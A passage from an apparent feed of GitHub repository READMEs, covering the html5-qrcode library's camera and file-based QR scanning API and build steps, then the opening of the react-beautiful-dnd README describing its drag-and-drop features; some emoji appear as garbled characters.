&lt;p&gt;You can use &lt;code&gt;Html5Qrcode&lt;/code&gt; class to set up your QR code scanner (with your own user interface) and allow users to scan QR codes using the camera or by choosing an image file in the file system or native cameras in smartphones.&lt;/p&gt; 
&lt;p&gt;You can use the following APIs to &lt;code&gt;fetch camera&lt;/code&gt;, &lt;code&gt;start&lt;/code&gt; scanning and &lt;code&gt;stop&lt;/code&gt; scanning.&lt;/p&gt; 
&lt;h4&gt;For using inline QR Code scanning with Webcam or Smartphone camera&lt;/h4&gt; 
&lt;h5&gt;Start Scanning&lt;/h5&gt; 
&lt;p&gt;To get a list of supported cameras, query it using static method &lt;code&gt;Html5Qrcode.getCameras()&lt;/code&gt;. This method returns a &lt;code&gt;Promise&lt;/code&gt; with a list of devices supported in format &lt;code&gt;{ id: &quot;id&quot;, label: &quot;label&quot; }&lt;/code&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// This method will trigger user permissions
Html5Qrcode.getCameras().then(devices =&amp;gt; {
  /**
   * devices would be an array of objects of type:
   * { id: &quot;id&quot;, label: &quot;label&quot; }
   */
  if (devices &amp;amp;&amp;amp; devices.length) {
    var cameraId = devices[0].id;
    // .. use this to start scanning.
  }
}).catch(err =&amp;gt; {
  // handle err
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Note that this method will trigger user permission if the user has not granted it already.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Warning: Direct access to the camera is a powerful feature. It requires consent from the user, and your site MUST be on a secure origin (HTTPS).&lt;/p&gt; 
 &lt;p&gt;Warning: Asking for access to the camera on page load will result in most of your users rejecting access to it. &lt;a href=&quot;https://developers.google.com/web/fundamentals/media/capturing-images&quot;&gt;More info&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Once you have the camera id from &lt;code&gt;device.id&lt;/code&gt;, start camera using &lt;code&gt;Html5Qrcode#start(..)&lt;/code&gt;. This method returns a &lt;code&gt;Promise&lt;/code&gt; with Qr code scanning initiation.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const html5QrCode = new Html5Qrcode(/* element id */ &quot;reader&quot;);
html5QrCode.start(
  cameraId, 
  {
    fps: 10,    // Optional frame per seconds for qr code scanning
    qrbox: 250  // Optional if you want bounded box UI
  },
  qrCodeMessage =&amp;gt; {
    // do something when code is read
  },
  errorMessage =&amp;gt; {
    // parse error, ignore it.
  })
.catch(err =&amp;gt; {
  // Start failed, handle it.
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;You can optionally set another argument in constructor called &lt;code&gt;verbose&lt;/code&gt; to print all logs to console&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const html5QrCode = new Html5Qrcode(&quot;reader&quot;, /* verbose= */ true);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h5&gt;Scanning without cameraId&lt;/h5&gt; 
&lt;p&gt;In mobile devices you may want users to directly scan the QR code using the back camera or the front camera for some use cases. For such cases you can avoid using the exact camera device id that you get from &lt;code&gt;Html5Qrcode.getCameras()&lt;/code&gt;. The &lt;code&gt;start()&lt;/code&gt; method allows passing constraints in place of camera device id similar to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia#Syntax&quot;&gt;html5 web API syntax&lt;/a&gt;. You can start scanning like mentioned in these examples:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const html5QrCode = new Html5Qrcode(&quot;#reader&quot;);
const qrCodeSuccessCallback = message =&amp;gt; { /* handle success */ }
const config = { fps: 10, qrbox: 250 };

// If you want to prefer front camera
html5QrCode.start({ facingMode: &quot;user&quot; }, config, qrCodeSuccessCallback);

// If you want to prefer back camera
html5QrCode.start({ facingMode: &quot;environment&quot; }, config, qrCodeSuccessCallback);

// Select front camera or fail with `OverconstrainedError`.
html5QrCode.start({ facingMode: { exact: &quot;user&quot;} }, config, qrCodeSuccessCallback);

// Select back camera or fail with `OverconstrainedError`.
html5QrCode.start({ facingMode: { exact: &quot;environment&quot;} }, config, qrCodeSuccessCallback);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Passing the &lt;code&gt;cameraId&lt;/code&gt; (recommended appraoch) is similar to&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;html5QrCode.start({ deviceId: { exact: cameraId} }, config, qrCodeSuccessCallback);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h5&gt;Stop Scanning&lt;/h5&gt; 
&lt;p&gt;To stop using camera and thus stop scanning, call &lt;code&gt;Html5Qrcode#stop()&lt;/code&gt; which returns a &lt;code&gt;Promise&lt;/code&gt; for stopping the video feed and scanning.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;html5QrCode.stop().then(ignore =&amp;gt; {
  // QR Code scanning is stopped.
}).catch(err =&amp;gt; {
  // Stop failed, handle it.
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Note that the class is stateful and &lt;code&gt;stop()&lt;/code&gt; should be called to properly tear down the video and camera objects safely after calling &lt;code&gt;start()&lt;/code&gt; when the scan is over or the user intend to move on. &lt;code&gt;stop()&lt;/code&gt; will stop the video feed on the viewfinder.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h4&gt;For QR Code scanning using local files or inbuild camera on Smartphones&lt;/h4&gt; 
&lt;p&gt;| Selector in Android | Selector in IOS| |------|-------| | Taken on Pixel 3, Google Chrome
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | Taken on iPhone 7, Google Chrome
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; |&lt;/p&gt; 
&lt;p&gt;You can alternatively leverage QR Code scanning for local files on the device or default camera on the device. It works similar to inline QR Code scanning.&lt;/p&gt; 
&lt;p&gt;Define the HTML container and import the javascript library as mentioned above&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div id=&quot;reader&quot; width=&quot;600px&quot; height=&quot;600px&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;script src=&quot;./minified/html5-qrcode.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;It&#39;s not mandatory to set the height and width of the HTML element. If provided, the library would try to honor it. If it&#39;s not set, the library would set a default width and derive the height based on the input image&#39;s aspect ratio.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Add an &lt;code&gt;Input&lt;/code&gt; element for supporting file selection like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;input type=&quot;file&quot; id=&quot;qr-input-file&quot; accept=&quot;image/*&quot;&amp;gt;
&amp;lt;!-- 
  Or add captured if you only want to enable smartphone camera, PC browsers will ignore it.
--&amp;gt;

&amp;lt;input type=&quot;file&quot; id=&quot;qr-input-file&quot; accept=&quot;image/*&quot; capture&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Find more information about this at &lt;a href=&quot;https://developers.google.com/web/fundamentals/media/capturing-images&quot;&gt;developers.google.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;And in javascript code initialize the object and attach listener like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const html5QrCode = new Html5Qrcode(/* element id */ &quot;reader&quot;);
// File based scanning
const fileinput = document.getElementById(&#39;qr-input-file&#39;);
fileinput.addEventListener(&#39;change&#39;, e =&amp;gt; {
  if (e.target.files.length == 0) {
    // No file selected, ignore 
    return;
  }

  const imageFile = e.target.files[0];
  // Scan QR Code
  html5QrCode.scanFile(imageFile, true)
  .then(qrCodeMessage =&amp;gt; {
    // success, use qrCodeMessage
    console.log(qrCodeMessage);
  })
  .catch(err =&amp;gt; {
    // failure, handle it.
    console.log(`Error scanning file. Reason: ${err}`)
  });
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Note that inline scanning and file-based scanning are mutually exclusive at the moment. This means you can only use one of them at a time. I&#39;ll soon be adding support for the option to have both if the requirement comes in. If you want to use both, use &lt;code&gt;html5QrCode#clear()&lt;/code&gt; method to clear the canvas.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Demo&lt;/h2&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; &lt;em&gt;Scan this image or visit &lt;a href=&quot;https://blog.minhazav.dev/research/html5-qrcode.html&quot;&gt;blog.minhazav.dev/research/html5-qrcode.html&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;h3&gt;For more information&lt;/h3&gt; 
&lt;p&gt;Check these articles on how to use this library:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://blog.minhazav.dev/HTML5-QR-Code-scanning-launched-v1.0.1/&quot;&gt;HTML5 QR Code scanning - launched v1.0.1 without jQuery dependency and refactored Promise based APIs&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://blog.minhazav.dev/HTML5-QR-Code-scanning-support-for-local-file-and-default-camera/&quot;&gt;HTML5 QR Code scanning with javascript - Support for scanning the local file and using default camera added (v1.0.5)&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Screenshots&lt;/h2&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/screen.gif&quot; alt=&quot;screenshot&quot;&gt;
 &lt;!-- raw HTML omitted --&gt; &lt;em&gt;Figure: Screenshot from Google Chrome running on Macbook Pro&lt;/em&gt;&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;Following methods are available in this library&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;class Html5Qrcode {
  /**
   * Returns a Promise with list of all cameras supported by the device.
   * 
   * The returned object is a list of result object of type:
   * [{
   *      id: String;     // Id of the camera.
   *      label: String;  // Human readable name of the camera.
   * }]
   */
  static getCameras() // Returns a Promise

  /**
   * Initialize QR Code scanner.
   * 
   * @param {String} elementId - Id of the HTML element.
   * @param {Boolean} verbose - Optional argument, if true, all logs
   *                  would be printed to console. 
   */
  constructor(elementId, verbose /* Optional */) {}

  /**
   * Start scanning QR Code for given camera.
   * 
   * @param {String or Object} identifier of the camera, it can either be the
   *  cameraId retrieved from {@code Html5Qrcode#getCameras()} method or
   *  object with facingMode constraint.
   *  Example values:
   *      - &quot;a76afe74e951cde2d3e29aa73065c9cd89438627b3bde&quot;
   *          ^ This is &#39;deviceId&#39; from camera retrieved from 
   *          {@code Html5Qrcode#getCameras()}
   *      - { facingMode: &quot;user&quot; }
   *      - { facingMode: &quot;environment&quot; }
   *      - { facingMode: { exact: &quot;environment&quot; } }
   *      - { facingMode: { exact: &quot;user&quot; } }
   *      - { deviceId: { exact: &quot;a76afe74e95e3....73065c9cd89438627b3bde&quot; }
   *      - { deviceId: &quot;a76afe74e95e3....73065c9cd89438627b3bde&quot; }
   *  Reference: https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia#Syntax
   * @param {Object} config extra configurations to tune QR code scanner.
   *  Supported Fields:
   *      - fps: expected framerate of qr code scanning. example { fps: 2 }
   *          means the scanning would be done every 500 ms.
   *      - qrbox: width of QR scanning box, this should be smaller than
   *          the width and height of the box. This would make the scanner
   *          look like this:
   *          ----------------------
   *          |********************|
   *          |******,,,,,,,,,*****|      &amp;lt;--- shaded region
   *          |******|       |*****|      &amp;lt;--- non shaded region would be
   *          |******|       |*****|          used for QR code scanning.
   *          |******|_______|*****|
   *          |********************|
   *          |********************|
   *          ----------------------
   *      - aspectRatio: Optional, desired aspect ratio for the video feed.
   *          Ideal aspect ratios are 4:3 or 16:9. Passing very wrong aspect
   *          ratio could lead to video feed not showing up.
   *      - disableFlip: Optional, if {@code true} flipped QR Code won&#39;t be
   *          scanned. Only use this if you are sure the camera cannot give
   *          mirrored feed if you are facing performance constraints.
   * @param {Function} qrCodeSuccessCallback callback on QR Code found.
   *  Example:
   *      function(qrCodeMessage) {}
   * @param {Function} qrCodeErrorCallback callback on QR Code parse error.
   *  Example:
   *      function(errorMessage) {}
   * 
   * @returns Promise for starting the scan. The Promise can fail if the user
   * doesn&#39;t grant permission or some API is not supported by the browser.
   */
  start(cameraId,
      configuration,
      qrCodeSuccessCallback,
      qrCodeErrorCallback) {}  // Returns a Promise

  /**
   * Stops streaming QR Code video and scanning. 
   * 
   * @returns Promise for safely closing the video stream.
   */
  stop() {} // Returns a Promise

  /**
   * Scans an Image File for QR Code.
   * 
   * This feature is mutually exclusive to camera based scanning, you should call
   * stop() if the camera based scanning was ongoing.
   * 
   * @param {File} imageFile a local file with Image content.
   * @param {boolean} showImage if true the Image will be rendered on given element.
   * 
   * @returns Promise with decoded QR code string on success and error message on failure.
   *            Failure could happen due to different reasons:
   *            1. QR Code decode failed because enough patterns not found in image.
   *            2. Input file was not image or unable to load the image or other image load
   *              errors.
   */
  scanFile(imageFile, /* default=true */ showImage) {}

  /**
   * Clears the existing canvas.
   * 
   * Note: in case of ongoing web cam based scan, it needs to be explicitly
   * closed before calling this method, else it will throw exception.
   */
  clear() {}  // Returns void
}

class Html5QrcodeScanner {
    /**
     * Creates instance of this class.
     *
     * @param {String} elementId - Id of the HTML element.
     * @param {Object} config extra configurations to tune QR code scanner.
     *  Supported Fields:
     *      - fps: expected framerate of qr scanning. example { fps: 2 }
     *          means the scanning would be done every 500 ms.
     *      - qrbox: width of QR scanning box, this should be smaller than
     *          the width and height of the box. This would make the scanner
     *          look like this:
     *          ----------------------
     *          |********************|
     *          |******,,,,,,,,,*****|      &amp;lt;--- shaded region
     *          |******|       |*****|      &amp;lt;--- non shaded region would be
     *          |******|       |*****|          used for QR code scanning.
     *          |******|_______|*****|
     *          |********************|
     *          |********************|
     *          ----------------------
     *      - aspectRatio: Optional, desired aspect ratio for the video feed.
     *          Ideal aspect ratios are 4:3 or 16:9. Passing very wrong aspect
     *          ratio could lead to video feed not showing up.
     *      - disableFlip: Optional, if {@code true} flipped QR Code won&#39;t be
     *          scanned. Only use this if you are sure the camera cannot give
     *          mirrored feed if you are facing performance constraints.
     * @param {Boolean} verbose - Optional argument, if true, all logs
     *                  would be printed to console. 
     */
    constructor(elementId, config, verbose) {}

    /**
     * Renders the User Interface
     * 
     * @param {Function} qrCodeSuccessCallback - callback on QR Code found.
     *  Example:
     *      function(qrCodeMessage) {}
     * @param {Function} qrCodeErrorCallback - callback on QR Code parse error.
     *  Example:
     *      function(errorMessage) {}
     * 
     */
    render(qrCodeSuccessCallback, qrCodeErrorCallback) {}

    /**
     * Removes the QR Code scanner.
     * 
     * @returns Promise which succeeds if the cleanup is complete successfully,
     *  fails otherwise.
     */
    clear() {}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Extra optional &lt;code&gt;configuration&lt;/code&gt; in &lt;code&gt;start()&lt;/code&gt; method&lt;/h3&gt; 
&lt;p&gt;Configuration object that can be used to configure both the scanning behavior and the user interface (UI). Most of the fields have default properties that will be used unless a different value is provided. If you do not want to override anything, you can just pass in an empty object &lt;code&gt;{}&lt;/code&gt;.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;fps&lt;/code&gt; - Integer, Example = 10&lt;/h4&gt; 
&lt;p&gt;A.K.A frame per second, the default value for this is 2 but it can be increased to get faster scanning. Increasing too high value could affect performance. Value &lt;code&gt;&amp;gt;1000&lt;/code&gt; will simply fail.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;qrbox&lt;/code&gt; - Integer, Example = 250&lt;/h4&gt; 
&lt;p&gt;Use this property to limit the region of the viewfinder you want to use for scanning. The rest of the viewfinder would be shaded. For example, by passing config &lt;code&gt;{ qrbox : 250 }&lt;/code&gt;, the screen will look like:&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h4&gt;&lt;code&gt;aspectRatio&lt;/code&gt; - Float, Example 1.777778 for 16:9 aspect ratio&lt;/h4&gt; 
&lt;p&gt;Use this property to render the video feed in a certain aspect ratio. Passing a nonstandard aspect ratio like &lt;code&gt;100000:1&lt;/code&gt; could lead to the video feed not even showing up. Ideal values can be: | Value | Aspect Ratio | Use Case | | ----- | ------------ | -------- | |1.333334 | 4:3 | Standard camera aspect ratio | |1.777778 | 16:9 | Fullscreen, cinematic | |1.0 | 1:1 | Square view |&lt;/p&gt; 
&lt;p&gt;If you do not pass any value, the whole viewfinder would be used for scanning. &lt;strong&gt;Note&lt;/strong&gt;: this value has to be smaller than the width and height of the &lt;code&gt;QR code HTML element&lt;/code&gt;.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;disableFlip&lt;/code&gt; - Boolean (Optional), default = false.&lt;/h4&gt; 
&lt;p&gt;By default, the scanner can scan for horizontally flipped QR Codes. This also enables scanning QR code using the front camera on mobile devices which are sometimes mirrored. This is &lt;code&gt;false&lt;/code&gt; by default and I recommend changing this only if:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;You are sure that the camera feed cannot be mirrored (Horizontally flipped)&lt;/li&gt; 
 &lt;li&gt;You are facing performance issues with this enabled.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Here&#39;s an example of normal and mirrored QR Code | Normal QR Code | Mirrored QR Code | | ----- | ---- | | 
 &lt;!-- raw HTML omitted --&gt; | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; |&lt;/p&gt; 
&lt;h2&gt;How to modify and build&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Code changes should only be made to 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/src/html5-qrcode.js&quot;&gt;src/html5-qrcode.js&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/src/html5-qrcode-scanner.js&quot;&gt;src/html5-qrcode-scanner.js&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/third_party/qrcode.js&quot;&gt;third_party/qrcode.js&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;npm run-script build&lt;/code&gt;. 
  &lt;blockquote&gt; 
   &lt;p&gt;This should do &lt;code&gt;transpiling&lt;/code&gt; --&amp;gt; &lt;code&gt;minification&lt;/code&gt; --&amp;gt; &lt;code&gt;merging&lt;/code&gt; different js code.&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
 &lt;li&gt;Testing 
  &lt;ul&gt; 
   &lt;li&gt;Run &lt;code&gt;npm test&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;Run the tests before sending PR, all tests should run.&lt;/li&gt; 
   &lt;li&gt;Please add tests for new behaviors sent in PR.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Send a pull request 
  &lt;ul&gt; 
   &lt;li&gt;Include all the changes to &lt;code&gt;./src&lt;/code&gt;, &lt;code&gt;./transpiled&lt;/code&gt;, &lt;code&gt;./minified&lt;/code&gt;. &lt;strong&gt;Do not change &lt;code&gt;./transpiled&lt;/code&gt; or &lt;code&gt;./minified&lt;/code&gt; manually.&lt;/strong&gt;&lt;/li&gt; 
   &lt;li&gt;In the PR add a comment like &lt;pre&gt;&lt;code&gt;@all-contributors please add @mebjas for this new feature or tests
&lt;/code&gt;&lt;/pre&gt; For calling out your contributions - the bot will update the contributions file.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Credits&lt;/h2&gt; 
&lt;p&gt;The decoder used for the QRcode reading is from &lt;code&gt;Zxing-js&lt;/code&gt; https://github.com/zxing-js/library
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>atlassian/react-beautiful-dnd</title>
      <link>https://github.com/atlassian/react-beautiful-dnd</link>
      <description>&lt;p&gt;Beautiful and accessible drag and drop for lists with React&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;strong&gt;Beautiful&lt;/strong&gt; and &lt;strong&gt;accessible&lt;/strong&gt; drag and drop for lists with &lt;a href=&quot;https://facebook.github.io/react/&quot;&gt;&lt;code&gt;React&lt;/code&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://circleci.com/gh/atlassian/react-beautiful-dnd/tree/master&quot;&gt;&lt;img src=&quot;https://img.shields.io/circleci/project/github/atlassian/react-beautiful-dnd/master.svg&quot; alt=&quot;CircleCI branch&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://www.npmjs.com/package/react-beautiful-dnd&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/react-beautiful-dnd.svg&quot; alt=&quot;npm&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/2182637/53614150-efbed780-3c2c-11e9-9204-a5d2e746faca.gif&quot; alt=&quot;quote application example&quot;&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://react-beautiful-dnd.netlify.com/iframe.html?selectedKind=board&amp;amp;selectedStory=simple&quot;&gt;Play with this example if you want!&lt;/a&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Core characteristics&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Beautiful and &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/animations.md&quot;&gt;natural movement&lt;/a&gt; of items üíê&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/about/accessibility.md&quot;&gt;Accessible&lt;/a&gt;: powerful keyboard and screen reader support ‚ôøÔ∏è&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/support/media.md&quot;&gt;Extremely performant&lt;/a&gt; üöÄ&lt;/li&gt; 
 &lt;li&gt;Clean and powerful api which is simple to get started with&lt;/li&gt; 
 &lt;li&gt;Plays extremely well with standard browser interactions&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/preset-styles.md&quot;&gt;Unopinionated styling&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;No creation of additional wrapper dom nodes - flexbox and focus management friendly!&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Get started üë©‚Äçüè´&lt;/h2&gt; 
&lt;p&gt;We have created &lt;a href=&quot;https://egghead.io/courses/beautiful-and-accessible-drag-and-drop-with-react-beautiful-dnd&quot;&gt;a free course on &lt;code&gt;egghead.io&lt;/code&gt; ü•ö&lt;/a&gt; to help you get started with &lt;code&gt;react-beautiful-dnd&lt;/code&gt; as quickly as possible.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://egghead.io/courses/beautiful-and-accessible-drag-and-drop-with-react-beautiful-dnd&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/2182637/43372837-8c72d3f8-93e8-11e8-9d92-a82adde7718f.png&quot; alt=&quot;course-logo&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Currently supported feature set ‚úÖ&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Vertical lists ‚Üï&lt;/li&gt; 
 &lt;li&gt;Horizontal lists ‚Üî&lt;/li&gt; 
 &lt;li&gt;Movement between lists (‚ñ§ ‚Üî ‚ñ§)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/patterns/virtual-lists.md&quot;&gt;Virtual list support üëæ&lt;/a&gt; - unlocking 10,000 items @ 60fps&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/combining.md&quot;&gt;Combining items&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Mouse üê≠, keyboard üéπ‚ôøÔ∏è and touch üëâüì± (mobile, tablet and so on) support&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/patterns/multi-drag.md&quot;&gt;Multi drag support&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Incredible screen reader support ‚ôøÔ∏è - we provide an amazing experience for english screen readers out of the box üì¶. We also provide complete customisation control and internationalisation support for those who need it üíñ&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/draggable.md#optional-props&quot;&gt;Conditional dragging&lt;/a&gt; and &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/droppable.md#conditionally-dropping&quot;&gt;conditional dropping&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Multiple independent lists on the one page&lt;/li&gt; 
 &lt;li&gt;Flexible item sizes - the draggable items can have different heights (vertical lists) or widths (horizontal lists)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/changes-while-dragging.md&quot;&gt;Add and remove items during a drag&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Compatible with semantic &lt;code&gt;&amp;lt;table&amp;gt;&lt;/code&gt; reordering - &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/patterns/tables.md&quot;&gt;table pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/auto-scrolling.md&quot;&gt;Auto scrolling&lt;/a&gt; - automatically scroll containers and the window as required during a drag (even with keyboard üî•)&lt;/li&gt; 
 &lt;li&gt;Custom drag handles - you can drag a whole item by just a part of it&lt;/li&gt; 
 &lt;li&gt;Able to move the dragging item to another element while dragging (clone, portal) - &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/guides/reparenting.md&quot;&gt;Reparenting your &lt;code&gt;&amp;lt;Draggable /&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/sensors/sensor-api.md&quot;&gt;Create scripted drag and drop experiences üéÆ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Allows extensions to support for &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/sensors/sensor-api.md&quot;&gt;any input type you like üïπ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üå≤ Tree support through the &lt;a href=&quot;https://atlaskit.atlassian.com/packages/confluence/tree&quot;&gt;&lt;code&gt;@atlaskit/tree&lt;/code&gt;&lt;/a&gt; package&lt;/li&gt; 
 &lt;li&gt;A &lt;code&gt;&amp;lt;Droppable /&amp;gt;&lt;/code&gt; list can be a scroll container (without a scrollable parent) or be the child of a scroll container (that also does not have a scrollable parent)&lt;/li&gt; 
 &lt;li&gt;Independent nested lists - a list can be a child of another list, but you cannot drag items from the parent list into a child list&lt;/li&gt; 
 &lt;li&gt;Server side rendering (SSR) compatible - see &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/reset-server-context.md&quot;&gt;resetServerContext()&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Plays well with &lt;a href=&quot;https://raw.githubusercontent.com/atlassian/react-beautiful-dnd/master/docs/api/draggable.md#interactive-child-elements-within-a-draggable-&quot;&gt;nested interactive elements&lt;/a&gt; by default&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Motivation ü§î&lt;/h2&gt; 
&lt;p&gt;&lt;code&gt;react-beautiful-dnd&lt;/code&gt; exists to create beautiful drag and drop for lists that anyone can use - even people who cannot see. For a good overview of the history and motivations of the project you can take a look at these external resources:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üìñ &lt;a href=&quot;https://medium.com/@alexandereardon/rethinking-drag-and-drop-d9f5770b4e6b&quot;&gt;Rethinking drag and drop&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üéß &lt;a href=&quot;https://reactpodcast.simplecast.fm/17&quot;&gt;React podcast: fast, accessible and beautiful drag and drop&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Not for everyone ‚úåÔ∏è&lt;/h2&gt; 
